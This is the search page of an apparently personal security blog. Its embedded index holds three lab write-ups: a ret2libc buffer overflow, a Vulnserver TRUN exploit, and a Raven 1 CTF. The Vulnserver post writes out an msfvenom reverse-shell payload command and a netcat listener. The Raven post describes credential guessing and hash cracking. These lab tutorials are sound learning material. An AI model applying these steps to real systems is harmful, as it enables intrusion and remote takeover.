<!DOCTYPE html>
<html lang="en">
<meta http-equiv="Content-Security-Policy" content="default-src *; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'self'; base-uri 'self'" />
<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title></title><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="$ Corrupted Protocols" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description." />
<meta property="og:description" content="Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description." />
<meta property="og:site_name" content="$ Corrupted Protocols" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="$ Corrupted Protocols" />
<script type="application/ld+json">
{"description":"Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.","@type":"WebPage","url":"/search.html","headline":"$ Corrupted Protocols","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
<body>
    <div class="container"><header>

  <h2>$ Corrupted Protocols</h2>
  <hr>

      <nav>

          <a href="/">Home</a>
          &nbsp
          <a href="/binary">Binary Exploitation</a>
          &nbsp
          <a href="/web">Web</a>
          &nbsp
          <a href="/ctf">CTF Writeup</a>
          &nbsp
          <a href="/machines">Machines</a>
          &nbsp
          <a href="/about">About Me</a>
          &nbsp
          <a href="/contact">Contact</a>
          &nbsp

          <form class="classform" style="display:inline !important;" action="/search.html" method="get">
            <label for="search-box">Search</label>
            <input placeholder="Search here"  class="inputform" type="text" id="search-box" name="query">
          </form>


      </nav>

    <hr>
</header>
<main>
      <div class="search">
    <ul id="search-results"></ul>

<script>
  window.store = {
    
      "binary-elf-x86-stack-buffer-overflow-basic-6-rootme": {
        "title": "ELF x86 — Stack buffer overflow basic 6 Rootme (App-System) (Introduction to Ret2libc)",
        "author": "Hariharan",
        "category": "",
        "content": "# ELF x86 — Stack buffer overflow basic 6 Rootme (App-System) (Introduction to Ret2libc)./Introduction to Ret2libc.sh $ Let me be honest with you, I was thinking ret2libc and Return oriented programming is a tough concept. But it turns out to be easy. I will be giving some basic introduction to Ret2libc (Return to Libc) before starting with the challenge. Feel free to skip the introduction part if you are familiar with Ret2lipage$ First, we have to know about the Non-Executable Stack.$ Non-executable stack (NX) is a virtual memory protection mechanism to block shell code injection from executing on the stack by restricting a particular memory and implementing the NX bit.$ This is a type of memory protection mechanism. You cannot do a normal buffer overflow here. We have been doing buffer overflow to execute a shell and get the flag. But if you see in challenge 6, we don’t have a shell function or a system call. We need to execute it ourselves by injecting a particular payload that can pop a shell.$ In this case, we use Ret2libc. But so far I was talking only about this challenge. As I said earlier, if you have a Non-Executable Stack, this method might come in handy../Libc.sh $ There is a library called Libc. Libc is a standard library for the C programming language. This contains various function like system() calls, strcpy() , exit() and so on. The basic ideology is to recreate the system call to a shell, which we have been seeing in previous Rootme challenges. But how?$ We need to locate the Libc and system() in the virtual memory after executing the program. Then find “/bin/bash” or “/bin/sh” which again will be located in the virtual memory. Accessing this library doesn’t have any connection with the memory protection (Non-Executable Stack). Then we execute a command like a system(“/bin/sh”) to execute a shell.$ Finding the system() inside Libc and “/bin/sh” is the next task. As usual, we just use gdb. Create a break-point at the main. Then executep system$ You’ll get the address for the system. Then we need to search for “/bin/sh” or “/bin/bash” which we need to use the proc map. It would be better to show this directly in the challenge.$ Don’t worry if you didn’t understand the above explanation. It will be much easier to relate when we do the challenge../Challenge.sh $ We will see the source code for the following challenge. $ Let us try to analyze the code. We have a variable “message” of type char and has a size of 20 bytes. This means it can hold 20 characters. We directly skip to setreuid(), as the function above doesn’t make any sense now. Then we see the strcpy(). It takes in the argument argv. Clearly, we need to give our input in the command line. Then it prints out the message. Strcpy() doesn’t care about the size of argv. The first 20 bytes will be assigned to the variable “message”. So this is our place of attack as we can overflow and overwrite EIP.$ First, we need to know the size of buffer and padding along with EBP to write our exploit. For this, use GDB and disassemble main. I am not pasting the entire code here as it is too long. $ If you analyze the code, clearly ebp-0x1c is used before strcpy(). If you have read my previous blogs, you’ll know why I am taking note of this. We know the variable “message” has a size of 20 bytes. Then EBP should be 4 bytes. So we need to find the padding size with the usual calculation. As usual, I am going to draw the stack diagram. $ With calculation, we can see the padding used here is 8 bytes. This can be directly obtained from starting of the code. But I like to use this method. Now we find where the system() and “/bin/sh” are located in the virtual memory. $ Now we have the address for the system(). Next, we need to see where “/bin/sh” is located. For this, we use the command “info proc map”. We note down the address of where Libc starts and where it ends. $ Now we can use a command called find . The syntax is as follows.find starting_address , ending_address , “string” $ Now we are ready to write our exploit. Basic methodology, First overflow the buffer with 32 bytes of a random character. Then place the system() address in little-endian format at EIP/Return Address. Now fill with 4 bytes of random character again and finally our address “/bin/sh” in little-endian format.$ But as already mentioned, we need to give this exploit as an argument. We use a $ symbol for this. And there we go! we found our flag!$ Hope you understood Ret2libc. I know it will be hard to understand at first, but try to do the challenge on your own. Also, draw a stack diagram like me. This will help you in the calculation.$ Do give some claps if you reached here :). And feel free to ask your doubts in the comment section. It would help others too!$ Goodbye :)",
        "url": "/binary/ELF x86 Stack buffer overflow basic 6 Rootme"
      }
      ,
    
      "binary-vulnserver": {
        "title": "Vulnserver",
        "author": "Hariharan",
        "category": "",
        "content": "# Vulnserver./Introduction to Buffer Overflow.sh $ Memory exploitation has always been a hacker’s delight. Techies have always tried to understand how memory hierarchy works. It is complicated how our primary and secondary devices function. A hacker understands how it works and exploits it by various means.$ Buffers are memory storage regions that temporarily hold data while it is transferred from one location to another. A buffer overflow occurs when the volume of data exceeds the storage capacity of the memory buffer. As a result, the program attempting to write the data to the buffer overwrites adjacent memory locations.$ It is a critical vulnerability that lets someone access your important memory locations. A hacker can insert his malicious script and gain access to the machine. Here is a picture that shows where a stack is located, which will be the place of exploitation. Heap is like a free-floating region of memory.$ Now let us try understanding the stack hierarchy. Stack hierarchy has extended stack pointer (ESP), Buffer space, extended base pointer (EBP), and extended instruction pointer (EIP).$ ESP holds the top of the stack. It points to the most-recently pushed value on the stack. A stack buffer is a temporary location created within a computer’s memory for storing and retrieving data from the stack. EBP is the base pointer for the current stack frame. EIP is the instruction pointer. It points to (holds the address of) the first byte of the next instruction to be executed.$ Imagine if we send a bunch of characters into the buffer. It should stop taking in characters when it reaches the end. But what if the character starts overwriting EBP and EIP? This is where a buffer overflow attack comes into place. If we can access the EIP, we could insert malicious scripts to gain control of the computer.$ But it is only fair to explain the buffer overflow with a practical lab.$ For performing this, we need some prerequisites.1 ) An attack machine — Can be any Linux distribution, preferably Kali Linux or Parrot OS . A Windows machine, preferably a Virtual Machine ( VM ).2 ) The Windows defender has to be switched off during the exploitation    Download the exploitable server in your windows VM from the GitHub repository here3 ) Download Immunity debugger in your Windows VM from here. Might need the appropriate python version it is asking for./Challenge.sh $ We are ready to start!$ The first step is spiking. Spiking is done to figure out what is vulnerable. Now run the Vulnserver and Immunity debugger as admin. In Immunity debugger, you’ll find an option called attach. Attach the Vulnserver to it. The next step is to run the debugger. You’ll find a play button in the toolbar ( Triangle button near the pause button ).$ To find the IP address of the Windows machine ( I am using Kali as the host machine and windows as VM ), we use a tool called Netdiscover.sudo netdiscover -i wlan0$ We can proceed to use a tool called netcat. You can use ‘man netcat’ for more details. By default, the vulnserver runs on port 9999.$ You can see that the connection is successful. We will be spiking at STATS to check if it is vulnerable.For this, we need to write a spiking script for STATS.$ Using a tool called generic_send_tcpgeneric_send_tcp ‘IP address’ 9999 stats.spk 0 0$ Where 0 0 indicates the initial and final boundary ( which is not required for us so use 0 0).We can see that the script runs and you can see some responses too. This is a big piture so kindly scroll to see.$ If there is a buffer overflow, the debugger will automatically stop and show a thread exception which doesn’t happen in STATS. Thus we could conclude that STATS is not vulnerable$ The next one we are going to choose is TRUN, which is beginner-friendly$ As soon as you run the script you can see the debugger pauses and shows violation.$ So we found the buffer overflow vulnerability in TRUN. We can go to the next step which will be fuzzing. It is similar to spiking.$ Fuzzing is a means of detecting potential implementation weaknesses that can be used to take advantage of any target.$ We create a script to send random characters into the buffer which will eventually overwrite the EBP and EIP. The key point here is to note the approximate amount of bytes at which TRUN crashes. We use python to create our script. We use sockets to connect to the vulnserver and send random characters. We use exception handling because sometimes things don’t go as we expect. Save the script and make it executable, the following command can be used. chmod +x fuzzer.py$ Remember to stop the script(control+c) when TRUN crashes, the immunity debugger will pause automatically$ The next step is to find the exact bytes at which the TRUN crashed. This step is called Finding the offset value. The main idea is to send a known pattern and see when the EIP gets overwritten. The pattern which gets overwritten can be used to find the exact bytes.$ There is a simple trick to do this. you can create a pattern using the Metasploit framework and use it in the script./usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2040$ Now copy the bunch of characters in the script. A bit of modification is required. Make it an executable after saving the script.$ Executing the script we see the following in the EIP$ As we got the pattern, we can use Metasploit to find the no of bytes it takes to overwrite EIP$ There we go ! we found the offset value. Now we can proceed to the next step which is overwriting. This is a step to confirm if the 2003 bytes are correct. We use the same script with slight modification. We try to overwrite the EIP with a bunch of ‘B’.$ This step should overwrite EIP with 4 ‘B’ is form of HEX , which is 42424242$ So now that it is confirmed that 2003 is correct, we move to the next step. The next step is finding the bad character.$ Depending on the program, certain hex characters may be reserved for special commands and could crash or have unwanted effects on the program if executed. An example is 0x00, the null byte. When the program encounters this hex character, it will mark the end of a string or command. This could make our shell code useless if the program will only execute a part of it.To figure out what hex characters we can’t use in the shellcode, we can just send a payload with all bytes from 0x01–0xFF and examine the program’s memory. The list of bad characters can be found in browser or you can copy this from herebadChars = (“\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f”“\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f”“\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f”“\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f”“\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f”“\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f”“\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f”“\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f”“\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f”“\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f”“\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf”“\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf”“\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf”“\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf”“\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef”“\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff”)$ Writing the script for finding the bad characters.$ Unfortunately, this doesn’t happen here, but I will share some clips where such a situation arises.$ Knowing that we don’t have a bad character problem, we can move on to the next step.$ We are nearing the end. This step is finding the right module. This step is a bit tough to understand as it may involve small concepts on endian architecture and assembly language.$ We need to find an address that contains the operation JMP ESP, but many protection mechanisms will be tough to find. Use mona.py to see modules that don’t have any protection mechanisms:$ mona.py can be downloaded from here$ The mona.py should be placed in the following folderC:/program files(x86)/immunity Inc/Immunity Debugger/PyCommands$ Now type !mona modules in the command bar$ We will have about 9 pointers, out of which 2 of them have all protection as false, this will be our point of attack.Now we will be targeting essfunc.dll. Things get confusing here, we need to set a breakpoint at JMP ESP. This is to write give our code. I will make it more clear as we go into the steps.$ For now, we need to find the opcode for JMP ESP for which we can use the NASM shell$ FFE4 it is. Converting to hex form, which can be understood by machine. We type !mona find -s “\\xff\\xe4” -m essfunc.dll ( which we found that it has all false in the protection ). We will have about 9 pointers, out of which the first one is the point of an attack ( Sorry for the spoiler :) )$ Now we need to set a break-point. For this, you will find a blue-black arrow ( 6 buttons after the run button ). Type the first pointer. Now the JMP ESP will get highlighted. To set a breakpoint, use a shortcut key F2. So you get it now? I set a breakpoint to insert my own code with my script.$ Now the concept of little endian comes in. We need to reverse the pointer by 2 bits. For example, if the address is 625011af, we use “\\xaf\\x11\\x50\\x62” in the script. To know more about little endian check this out here$ Now everything is ready, let’s run the script.$ We can see that the EIP gets overwritten by the first pointer of essfunc.dll.$ Success! We can move to the final step which is Getting a shellcode. The shellcode should be in hex form. We use a tool called msfvenom for this.msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 EXITFUNC=thread -f c -a x86 -b “\\x00”$ whereLHOST is the Attack machine ( in my case it is Kali ), use ifconfig to your machine’s IPEXITFUNC=thread is for making the shell stable-f is for the file type, here it is C-a is for architecture, here it is x86-b is for bad character, which only the null byte is needed here$ just copy the hex part and use it in the python script. The concept of NOPS comes into place now. We use NOPS to avoid interference. Sometimes our code might not work. Depending on the payload size you can reduce the no of bytes used. The debugger is not required for this step.$ Remember we set LPORT as 4444, so we have to set up a listener.$AND WE HAVE THE ACCESS !!!$ It is a reverse shell and using netcat we were able to listen to port 4444.$ TRUN was relatively simple. The other modules may be tough, but possible to exploit. With practice, Buffer overflow is a piece of cake. I hope you understood this and will continue your memory exploitation.$ Goodbye :)",
        "url": "/binary/Vulnserver"
      }
      ,
    
      "ctf-raven1": {
        "title": "Raven 1 CTF Writeup",
        "author": "Hariharan",
        "category": "",
        "content": "# Raven 1 CTF Writeup$ ./Introduction to Raven CTF.sh $ Capture the flag (CTF ) is a challenge-based task where a player tries to find all the flags in the given box. They provide an opportunity for fun, self-driven learning, and can practice new skills. Today we will be solving a CTF from Vulnhub called Raven.$ Raven1, an example of a perfectly built CTF, with a practical approach. This tricky box is quite interesting with many tools and techniques involved. The box can be downloaded from the site$ Website to Download Raven CTF$ The task in this CTF is to find out the 4 flags which are well hidden in the box.$ ./Challenge.sh $ The first step is to find the IP address of the box running as a virtual machine, You could either use netdiscover or any other tool of your choice.$ Now it is always advised to enumerate the machine rather than following a blind approach. Understanding every step is crucial. A basic network scan is important for a CTF. This is done to reveal the open ports and even find the vulnerability using various scripts. $ Now there are 3 open ports, and out of those three, SSH and HTTP are very common. Using the IP address of the machine in the browser and seeing if there is anything popping up!$ The page has a lot of hyperlinks. The next thing to check out is the Developer Tools and inspect the page. Sometimes things are often hidden here. This makes the challenge even tougher $ The first flag is well hidden inside the developer tools.$ The next step after this would be finding the directories. Using a tool called Dirbuster to find out the directory. This is a common technique and avoids a blind approach towards the CTF $ There is a WordPress directory.$ WordPress has a bad past with vulnerability. Starting a WPscan could reveal the version and vulnerability. The syntax for the WPscan might be a little confusing. But there is always a “man” command to our rescue! $ The scan might take a couple of minutes to finish.$ After the scan completes, there is a database that gives us the username. Maybe this can be used for SSH? Let’s see! $ But there is a problem here. The password for the given username is unknown. It is a good practice to try out the common passwords before using a brute force technique. Here the username and password were both “michael”. $ The next step is privilege escalation. But before that let’s have a look at the files on the machine. $ When you SSH to the machine and search the machine, there is a folder called “www” Which had the second flag.$ Again with a deep search, there was a folder called WordPress. The location to this is /var/www/html/wordpress/wp-config.php. There could be a database related to WordPress.$ Using MySQL for this purpose. $ Changing our working database to WordPress, the tables are visible now. There are few interesting tables like wp_users. $ The wp_posts contains the flag3 and flag4. which actually is the end of the CTF. But wait? The root access !!! The table wp_users contains the hashes of the password. $ Cracking the hashes with a tool called john. This gives us the password for steven, which is also the password for the root access!$ The password is now available in the john folder. $ That was quite interesting, right? A very simple approach yet tough to figure it out. Sometimes there might be difficulty while doing a CTF, but with practice, it is possible to master the tools and techniques involved. There is a Raven2 room too, for which the write-ups will be out soon.$ Goodbye :)",
        "url": "/ctf/Raven1"
      }
      
    
  };
</script>
<script src="/js/lunr.min.js"></script>
<script src="/js/search.js"></script>

</div>

    </main><footer>
  Visit Contact for More Info
</footer>
</div>
  </body>
</html>
